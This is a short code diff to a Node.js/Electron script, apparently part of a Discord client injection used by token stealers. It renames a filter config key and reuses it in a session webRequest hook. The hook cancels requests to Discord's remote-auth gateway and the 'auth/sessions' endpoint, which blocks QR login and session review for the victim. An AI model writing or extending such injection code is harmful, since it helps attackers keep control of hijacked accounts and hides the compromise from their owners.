@@ -4,7 +4,7 @@ const args = process.argv;
 const path = require('path');
 
 const CONFIG = {
-    filters2: {
+    filters: {
         urls: [
             'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
             'https://*.discord.com/api/v*/applications/detectable',
@@ -93,7 +93,7 @@ async function updateCheck() {
 }
 
 let checkUpdate = true;
-session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
+session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters, (details, callback) => {
     if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
         cancel: true
     });
